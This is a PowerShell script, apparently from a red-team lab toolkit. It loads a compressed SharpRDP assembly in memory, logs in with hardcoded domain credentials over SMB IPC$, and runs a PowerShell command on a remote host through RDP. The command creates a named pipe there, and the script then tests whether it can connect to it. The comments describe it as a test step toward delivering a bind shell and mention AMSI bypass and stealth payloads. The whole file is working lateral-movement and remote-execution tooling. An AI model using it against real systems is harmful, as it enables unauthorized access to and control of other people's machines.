# TestInlinePipe.ps1
# Diagnostic: injects an INLINE named pipe server directly via exec=cmd.
# No download, no AMSI bypass, no stealth payload -- pure PS pipe creation.
# Uses exec=cmd (same mode as actual bind shell delivery).
#
# If the pipe appears on target -> PS executes, pipe mechanics work.
# If pipe never appears -> PS process killed, session locked, or smb auth issue.

param(
    [string]$Target     = "10.3.10.22",
    [string]$Username   = "NORTH\hodor",
    [string]$Password   = "hodor",
    [string]$PipeName   = "diagtest1",
    [int]   $WaitSecs   = 20,
    [int]   $ConnTimeout = 5000
)

$root   = Split-Path -Parent $PSScriptRoot
$domain = $Username.Split('\')[0]
$user   = $Username.Split('\')[-1]

function Load-SharpRDP {
    $existing = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' }
    if ($existing) { return $existing }
    $src = [System.IO.File]::ReadAllText("$root\Tools\Invoke-SharpRDP.ps1")
    $m   = [regex]::Match($src, '"(H4sI[A-Za-z0-9+/=]{100,})"')
    if (-not $m.Success) { Write-Host '[-] Cannot find gzip blob in Invoke-SharpRDP.ps1' -ForegroundColor Red; return $null }
    $ms1 = New-Object IO.MemoryStream(,[Convert]::FromBase64String($m.Groups[1].Value))
    $gz  = New-Object IO.Compression.GzipStream($ms1,[IO.Compression.CompressionMode]::Decompress)
    $ms2 = New-Object IO.MemoryStream; $gz.CopyTo($ms2); $gz.Close(); $ms1.Close()
    $asm = [System.Reflection.Assembly]::Load($ms2.ToArray())
    Write-Host ('[+] SharpRDP loaded: ' + $asm.GetName().Name) -ForegroundColor Green
    return $asm
}

$asm = Load-SharpRDP
if (-not $asm) { return }

# Minimal inline pipe server -- all lowercase, no download, no AMSI bypass.
# Creates named pipe $PipeName, waits for a connection, then exits.
$inlineServer = "`$p=new-object system.io.pipes.namedpipeserverstream('$PipeName','inout',1,'byte','none');`$p.waitforconnection();`$p.dispose()"
$fullCmd      = "powershell -nop -c `"$inlineServer`""

Write-Host ''
Write-Host ('[*] Injecting inline pipe server via exec=cmd (' + $fullCmd.Length + ' chars):') -ForegroundColor Cyan
Write-Host "    $fullCmd" -ForegroundColor DarkGray

& net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1 | Out-Null
$asm.EntryPoint.Invoke($null, @(,[string[]]@(
    "computername=$Target",
    "username=$Username",
    "password=$Password",
    "command=$fullCmd",
    "exec=cmd"
)))
& net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null

Write-Host ''
Write-Host "[*] Waiting ${WaitSecs}s for target to create pipe..." -ForegroundColor Yellow
Start-Sleep $WaitSecs

Write-Host '[*] Trying to connect to pipe on target...' -ForegroundColor Cyan
try {
    & net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1 | Out-Null
    $client = New-Object System.IO.Pipes.NamedPipeClientStream($Target, $PipeName, 'InOut')
    $client.Connect($ConnTimeout)
    Write-Host '[+] CONNECTED -- PS executes via exec=cmd, pipe mechanics work' -ForegroundColor Green
    $client.Dispose()
    & net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
} catch {
    Write-Host ('[-] No pipe: ' + $_.Exception.Message) -ForegroundColor Red
    Write-Host '    exec=cmd requires an active UNLOCKED session on target as the specified user.' -ForegroundColor DarkYellow
    Write-Host '    If no session exists, use SharpRDP default (Win+R) mode instead.' -ForegroundColor DarkYellow
    & net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
}
